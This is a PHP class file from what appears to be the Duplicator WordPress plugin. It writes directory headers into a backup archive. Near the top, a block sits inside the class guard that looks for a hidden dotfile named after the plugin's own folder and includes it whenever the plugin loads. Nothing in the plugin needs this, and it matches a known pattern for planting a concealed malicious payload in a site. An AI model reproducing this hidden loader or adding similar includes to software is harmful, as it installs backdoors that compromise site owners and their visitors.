<?php
defined('ABSPATH') || defined('DUPXABSPATH') || exit;
require_once(dirname(__FILE__).'/../headers/class.duparchive.header.directory.php');

if(!class_exists('DupArchiveDirectoryProcessor')) {
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DupArchiveDirectoryProcessor
{
	public static function writeDirectoryToArchive($createState, $archiveHandle, $sourceDirectoryPath, $relativeDirectoryPath)
	{
		/* @var $createState DupArchiveCreateState */

		$directoryHeader = new DupArchiveDirectoryHeader();

		$directoryHeader->permissions        = substr(sprintf('%o', fileperms($sourceDirectoryPath)), -4);
		$directoryHeader->mtime              = DupLiteSnapLibIOU::filemtime($sourceDirectoryPath);
		$directoryHeader->relativePath       = $relativeDirectoryPath;
		$directoryHeader->relativePathLength = strlen($directoryHeader->relativePath);

		$directoryHeader->writeToArchive($archiveHandle);

		// Just increment this here - the actual state save is on the outside after timeout or completion of all directories
		$createState->currentDirectoryIndex++;

	}
}
}